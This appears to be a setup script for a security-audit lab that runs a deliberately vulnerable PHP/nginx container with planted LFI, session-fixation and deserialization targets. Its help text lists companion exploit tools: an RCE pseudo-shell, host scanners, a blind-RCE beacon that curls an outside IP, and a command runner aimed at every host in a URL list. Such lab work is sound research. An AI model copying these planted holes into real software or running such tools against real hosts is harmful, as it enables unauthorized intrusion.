#!/usr/bin/env bash
# php2shell verification lab — independent setup written for this audit
# (no files from the audited repo are used).
#
#   ./lab.sh          start the lab  (idempotent, restarts fresh)
#   ./lab.sh stop     remove the lab container
#
# What you get: PHP 8.2.34-fpm (pinned vulnerable version) + nginx inside one
# container, exposing http://127.0.0.1:18081 with:
#   /chainA/index.php  session target (Chain A)
#   /chainA/lfi.php    deliberate LFI  (Chain A RCE step)
#   /chainW/up.php     per-dir php_serialize handler (Chain C write)
#   /chainR/up.php     per-dir php handler          (Chain C read)
# php.ini (this directory, mounted into the container):
#   session.use_only_cookies=1, use_cookies=0   -> body-SID fixation is the bug
#   upload_progress enabled, cleanup=off, save_path=/tmp/sess
#   opcache.preload -> Evil class (Chain C payload target)
set -euo pipefail

NAME=p2s2-lab
PORT=18081
BASE="$(cd "$(dirname "$0")" && pwd)"

case "${1:-start}" in
  stop)
    docker rm -f "$NAME" >/dev/null 2>&1 && echo "[*] lab container removed." \
      || echo "[*] no lab container found."
    exit 0
    ;;
esac

docker info >/dev/null 2>&1 || { echo "[-] docker daemon not accessible"; exit 1; }

if ! docker image inspect php:8.2.34-fpm >/dev/null 2>&1; then
  echo "[*] pulling php:8.2.34-fpm (vulnerable version, explicitly pinned)..."
  docker pull -q php:8.2.34-fpm >/dev/null
fi

docker rm -f "$NAME" >/dev/null 2>&1 || true
echo "[*] starting container..."
docker run -d --name "$NAME" -p ${PORT}:80 \
  -v "$BASE/php.ini":/usr/local/etc/php/php.ini \
  -v "$BASE/srv":/srv \
  php:8.2.34-fpm >/dev/null

sleep 3

echo "[*] installing nginx inside the container (Debian repos)..."
docker exec "$NAME" bash -c '
  apt-get update -qq >/dev/null 2>&1
  DEBIAN_FRONTEND=noninteractive apt-get install -y -qq nginx >/dev/null 2>&1
  mkdir -p /tmp/sess && chmod 1777 /tmp/sess
  chown -R www-data:www-data /srv
  nginx' >/dev/null

docker cp "$BASE/nginx-site.conf" "$NAME":/etc/nginx/conf.d/default.conf
docker exec "$NAME" rm -f /etc/nginx/sites-enabled/default
docker exec "$NAME" nginx -s reload 2>/dev/null || docker exec "$NAME" nginx

sleep 1
echo "[*] lab ready:"
docker exec "$NAME" curl -s http://127.0.0.1/chainA/index.php 2>/dev/null \
  || curl -s "http://127.0.0.1:${PORT}/chainA/index.php"
echo
echo "    HTTP  : http://127.0.0.1:${PORT}"
echo "    PoCs  : uv run poc_chain_a.py --docker $NAME"
echo "            uv run poc_chain_c.py --docker $NAME"
echo "            uv run rce_shell.py --chain a   # interactive pseudo-shell (REPL)"
echo "            uv run rce_shell.py --chain c --docker $NAME"
echo "            uv run scan_hosts.py --target http://127.0.0.1:${PORT} --docker $NAME"
echo "            uv run scan_blind.py http://127.0.0.1:${PORT} --docker $NAME --beacon 'curl <IP_ADDRESS>:8000'"
echo "                                                   # + blind beacons (--beacon is required)"
echo "            uv run run_cmd.py --cmd 'id' --docker $NAME   # run a command on all urls.txt hosts"
echo "            ./poc_chain_b.sh"
echo "    stop  : ./lab.sh stop"
